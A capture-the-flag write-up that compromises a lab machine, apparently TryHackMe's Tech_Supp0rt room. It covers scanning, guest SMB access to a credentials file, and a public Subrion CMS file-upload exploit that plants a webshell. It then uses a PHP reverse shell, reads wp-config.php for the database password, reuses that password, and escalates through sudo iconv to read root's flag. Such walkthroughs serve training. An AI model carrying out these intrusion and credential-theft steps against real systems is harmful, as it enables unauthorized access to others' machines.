# Nmap Scan

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -sV $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-16 09:51 UTC
Nmap scan report for 10.10.157.78
Host is up (0.065s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-16T06:52:10
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-04-16T12:22:09+05:30
|_clock-skew: mean: -4h49m56s, deviation: 3h10m31s, median: -2h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds

```

# Dirb Scan

```
---- Scanning URL: http://10.10.157.78/ ----
+ http://10.10.157.78/index.html (CODE:200|SIZE:11321)
+ http://10.10.157.78/phpinfo.php (CODE:200|SIZE:95014)
+ http://10.10.157.78/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.157.78/test/
==> DIRECTORY: http://10.10.157.78/wordpress/
```

Found a wordpress website at `http://10.10.157.78/wordpress/` and a phising website (probably used by the scammer) at `http://10.10.157.78/`.

The login page of the wordpress website is at `http://10.10.157.78/wordpress/wp-login.php`.

The blog posts were published by a user named support, so this is the name of the wordpress account that we want to get access to.

I used a wpscan to see if I can find a vulnerability on the website:

```
wpscan --url http://10.10.157.78/wordpress/ -e u vp
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.157.78/wordpress/ [10.10.157.78]
[+] Started: Sat Apr 16 10:17:38 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.157.78/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.157.78/wordpress/, Match: 'WordPress 5.7.2'

[+] WordPress theme in use: teczilla
 | Location: http://10.10.157.78/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2021-11-17T00:00:00.000Z
 | Readme: http://10.10.157.78/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.3
 | Style URL: http://10.10.157.78/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.78/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] support
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.157.78/wordpress/index.php/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Apr 16 10:17:44 2022
[+] Requests Done: 67
[+] Cached Requests: 7
[+] Data Sent: 16.992 KB
[+] Data Received: 18.765 MB
[+] Memory used: 168.484 MB
[+] Elapsed time: 00:00:05
```

but nothing, then I tried for like 20 mins to bruteforce the user support, but nothing worked:

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url 10.10.157.78/wordpress --passwords /usr/share/wordlists/rockyou.txt.gz --usernames support
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.157.78/wordpress/ [10.10.157.78]
[+] Started: Sat Apr 16 10:29:51 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.157.78/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.157.78/wordpress/, Match: 'WordPress 5.7.2'

[+] WordPress theme in use: teczilla
 | Location: http://10.10.157.78/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2021-11-17T00:00:00.000Z
 | Readme: http://10.10.157.78/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.3
 | Style URL: http://10.10.157.78/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.78/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Progress Time: 00:00:00 <                                                     > (0 / 214240)  0.00%  ETA: ??:??:??
[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Apr 16 10:29:57 2022
[+] Requests Done: 140
[+] Cached Requests: 35
[+] Data Sent: 37.788 KB
[+] Data Received: 20.347 KB
[+] Memory used: 262.949 MB
[+] Elapsed time: 00:00:06

Scan Aborted: invalid byte sequence in UTF-8
Trace: /usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:52:in `gsub!'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:52:in `text'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:21:in `tag'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:199:in `conv2value'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:121:in `block in methodCall'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:120:in `collect'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:120:in `methodCall'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/app/models/xml_rpc.rb:48:in `method_call'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.20/app/finders/passwords/xml_rpc.rb:11:in `login_request'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:39:in `block (2 levels) in attack'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:38:in `each'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:38:in `block in attack'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:33:in `foreach'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:33:in `attack'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.20/app/controllers/password_attack.rb:45:in `run'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/controllers.rb:50:in `each'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/controllers.rb:50:in `block in run'
/usr/lib/ruby/2.7.0/timeout.rb:78:in `timeout'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/controllers.rb:45:in `run'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/scan.rb:24:in `run'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.20/bin/wpscan:17:in `block in <top (required)>'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.13.6/lib/cms_scanner/scan.rb:15:in `initialize'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.20/bin/wpscan:6:in `new'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.20/bin/wpscan:6:in `<top (required)>'
/usr/bin/wpscan:25:in `load'
/usr/bin/wpscan:25:in `<main>'
```

So I went back to the nmap scan and looked into the SMB. Tried to connect as a guest and it worked!

```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //$ip/websvr
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 07:17:38 2021
  ..                                  D        0  Sat May 29 07:03:47 2021
  enter.txt                           N      273  Sat May 29 07:17:38 2021

                8460484 blocks of size 1024. 5694996 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> ^C

```

Listed the files, saw that there is a file `enter.txt` downloaded it and outputed the content:

```
┌──(kali㉿kali)-[~]
└─$ cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```

Wow, this are some interesting goals, but the more important stuff is the subrion creds.

So I found the page that used to login into subrion `$ip/subrion/panel`.
I tried to login with the username: `admin` and the password: `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`, but it didn't worked. The file gives us a hint about the password `[cooked with magical formula]`, which means that this is encrypted.

I used CyberChief to decrypt it and got the password.

After, trying to again, we are in!

Then, I searched for an exploit by using `searchsploit` and found a Arbitrary File Upload exploit:

```
┌──(kali㉿kali)-[~/ctf/tryhackme/Tech_Supp0rt:1]
└─$ searchsploit subrion 4.2.1
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                         | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                          | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                       | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross-Site Scripting                                        | php/webapps/45150.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So i downloaded the arbitrary file upload exploit:

```
┌──(kali㉿kali)-[~/ctf/tryhackme/Tech_Supp0rt:1]
└─$ searchsploit -m php/webapps/49876.py
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines (956)

Copied to: /home/kali/ctf/tryhackme/Tech_Supp0rt:1/49876.py
```

and executed it:

```
┌──(kali㉿kali)-[~/ctf/tryhackme/Tech_Supp0rt:1]
└─$ python3 49876.py -u http://10.10.178.31/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://10.10.178.31/subrion/panel/
[+] Success!
[+] Got CSRF token: OSUbOvNhBnPUdoS3GyvAnWC9UrcpWqVZNNwWs0En
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: grutdmevxsbarvf

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.178.31/subrion/panel/uploads/grutdmevxsbarvf.phar
```

So now we have a shell and can execute files that are uploaded on subrion. After this I went to subrion files and I uploaded a reverse shell generated from (revshells)[https://www.revshells.com], more exactly I used the `PHP PentestMonkey`.

I uploaded the file to subrion and named it shell.php. After listing all the files we can see it:

`$ ls grutdmevxsbarvf.phar shell.php test.txt`

So I executed it `php shell.php`, now we have reverse shell!

Now we use python to get a bash: `python3 -c 'import pty;pty.spawn("bin/bash")'`, now we got to `var/www/html/wordpress` and cat the contents of the `wp-config.php`, to see if it contains the username and password of the account.

Bingo!:

```
/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

we now have the credentials to connect to wordpress.

By listing the content of the `/home` folder we can see that there is a user called `scamsite`, we can try to login in with the password from the wordpress:

```
www-data@TechSupport:/home$ su scamsite
su scamsite
Password: ImAScammerLOL!123!
```

and we are in!

Now let's try to use privilege exploitation and become root. We can use the command `sudo -l` to see what commands we can run as root:

```
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

We can now search how we can become root on https://gtfobins.github.io/.

We know that the flag is located at `/root/root.txt`,so we can use File read to read the file:

`LFILE=/root/root.txt`

then we use this command to output the content of the file:

```
sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
851b8233a8c0*********1529bf1ed02790b
```

Thanks, for reading :)
